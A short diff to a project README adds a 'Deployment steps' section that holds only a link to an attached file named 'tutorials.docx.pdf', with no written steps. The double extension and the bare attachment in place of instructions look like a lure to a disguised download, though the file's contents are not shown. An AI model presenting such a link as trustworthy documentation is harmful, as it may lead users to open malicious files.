@@ -90,6 +90,14 @@ All endpoints require `X-API-Key` header starting with `rf_live_`.
 - **Mobile**: Flutter
 - **Deployment**: Railway (CLI automated)
 
+## Deployment steps
+
+[tutorials.docx.pdf](https://github.com/user-attachments/files/26635096/tutorials.docx.pdf)
+
+
 ---
 
 **Security isn't an afterthought — it's the foundation.**
+
+
+
